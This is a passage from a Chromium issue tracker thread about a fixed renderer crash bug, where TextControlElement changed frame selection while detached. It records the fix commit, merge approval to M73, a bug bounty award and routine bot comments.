Change-Id: I824e2950c5cb38b87288f25120a7a0e32f8f78df
Reviewed-on: https://chromium-review.googlesource.com/c/1469402
Reviewed-by: Kent Tamura <tkent@chromium.org>
Reviewed-by: Xianzhu Wang <wangxianzhu@chromium.org>
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Cr-Commit-Position: refs/heads/master@{#631580}
[modify] https://crrev.com/89fd23887da1ef574a6fc97ab5f48d5b3e3dca4b/third_party/blink/renderer/core/dom/container_node.cc
[modify] https://crrev.com/89fd23887da1ef574a6fc97ab5f48d5b3e3dca4b/third_party/blink/renderer/core/editing/frame_caret.cc
[modify] https://crrev.com/89fd23887da1ef574a6fc97ab5f48d5b3e3dca4b/third_party/blink/renderer/core/html/forms/text_control_element.cc
[add] https://crrev.com/89fd23887da1ef574a6fc97ab5f48d5b3e3dca4b/third_party/blink/web_tests/fast/forms/select_detached_textarea_crash.html


### xi...@chromium.org (2019-02-13)

cloudfuzzer@, could you verify the fix at #40?

### cl...@gmail.com (2019-02-13)

I was unable to reproduce the crash with the patch applied :)

### xi...@chromium.org (2019-02-13)

Great!

### sh...@chromium.org (2019-02-13)

This bug requires manual review: M73 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), cindyb@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2019-02-13)

To merge reviewers:

The fix is a pretty safe fix that:
- It's effective only when |Document::focused_element_| is disconnected, which is already an unexpected case
- The patch stops |TextControlElement| from doing further unexpected actions on DOM and selection in this unexpectated case

### sh...@chromium.org (2019-02-14)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-02-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-15)

[Empty comment from Monorail migration]

### na...@google.com (2019-02-19)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-20)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-21)

This bug requires manual review: M73 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), cindyb@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@google.com (2019-02-21)

Approved for 73. branch:3683

### cr...@appspot.gserviceaccount.com (2019-02-22)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/c2706a542389bc84a4e62a0280b2c087e50e4986

Commit: c2706a542389bc84a4e62a0280b2c087e50e4986
Author: xiaochengh@chromium.org
Commiter: xiaochengh@chromium.org
Date: 2019-02-22 19:44:10 +0000 UTC

TextControlElement should not change frame selection when detached

TextControlElement::SetSelectionRange() maintains its own selection
range cache, and changes FrameSelection when focused. However, there are
some cases where the document's focused element can be left detached,
resulting in TextControlElement to set invalid FrameSelection.

As fixing the the focus maintenance is more involved, this patch works
around that by stopping TextControlElement to set FrameSelection if it's
detached.

Bug: 927646
Change-Id: I824e2950c5cb38b87288f25120a7a0e32f8f78df
Reviewed-on: https://chromium-review.googlesource.com/c/1469402
Reviewed-by: Kent Tamura <tkent@chromium.org>
Reviewed-by: Xianzhu Wang <wangxianzhu@chromium.org>
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#631580}(cherry picked from commit 89fd23887da1ef574a6fc97ab5f48d5b3e3dca4b)
Reviewed-on: https://chromium-review.googlesource.com/c/1483833
Reviewed-by: Xiaocheng Hu <xiaochengh@chromium.org>
Cr-Commit-Position: refs/branch-heads/3683@{#580}
Cr-Branched-From: e51029943e0a38dd794b73caaf6373d5496ae783-refs/heads/master@{#625896}

### aw...@google.com (2019-02-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-02-25)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2019-02-25)

Thanks as ever, $3,000 for this report!

### aw...@google.com (2019-03-04)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-13)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/927646?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093919)*
